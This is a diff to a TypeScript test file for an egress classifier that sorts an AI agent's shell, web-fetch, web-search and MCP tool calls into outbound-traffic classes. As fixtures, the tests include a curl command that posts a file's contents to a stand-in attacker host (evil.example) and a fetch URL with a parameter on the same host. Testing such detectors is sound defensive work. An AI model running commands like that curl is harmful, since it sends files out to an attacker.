@@ -287,13 +287,14 @@ const ids = (tool: string, input: Record<string, unknown>) => classifyEgress({ t
 
 test('classifyEgress puts the shell denylist in the shell-outward class, for Bash and PowerShell', () => {
   expect(ids('Bash', { command: 'git push origin main' })).toEqual(['shell-outward'])
-  expect(ids('PowerShell', { command: 'curl -d @x http://evil.example' })).toEqual(['shell-outward'])
+  // A curl with a body also matches the richer net-client shape (round two).
+  expect(ids('PowerShell', { command: 'curl -d @x http://evil.example' })).toEqual(['shell-outward', 'net-client'])
   expect(ids('Bash', { command: 'ls -la' })).toEqual([])
 })
 
-test('classifyEgress puts WebFetch in the web-fetch class', () => {
+test('classifyEgress puts WebFetch in the web-fetch class and WebSearch in web-search', () => {
   expect(ids('WebFetch', { url: 'https://evil.example/?k=1' })).toEqual(['web-fetch'])
-  expect(ids('WebSearch', { query: 'weather' })).toEqual([])
+  expect(ids('WebSearch', { query: 'weather' })).toEqual(['web-search'])
 })
 
 test('classifyEgress puts MCP write-class tools in mcp-write and leaves reads out', () => {
